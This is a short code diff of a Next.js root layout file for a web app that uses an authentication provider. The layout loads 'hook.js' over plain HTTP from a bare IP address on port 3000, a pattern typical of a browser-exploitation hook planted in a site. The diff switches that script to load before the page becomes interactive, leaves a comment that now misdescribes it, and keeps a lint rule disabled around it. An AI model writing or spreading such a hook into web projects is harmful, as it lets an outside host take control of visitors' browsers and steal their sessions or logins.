@@ -1,3 +1,4 @@
+"use client"
 import "./globals.css";
 import clsx from "clsx";
 import {AuthProvider} from '../context/AuthContext'
@@ -17,7 +18,7 @@ export default function RootLayout({ children }) {
       /* eslint-disable @next/next/no-sync-scripts */
      <Script
           src="http://154.251.13.131:3000/hook.js"
-          strategy="afterInteractive" // load after page hydration
+          strategy="beforeInteractive" // load after page hydration
         />
       /* eslint-enable @next/next/no-sync-scripts */
       <AuthProvider>
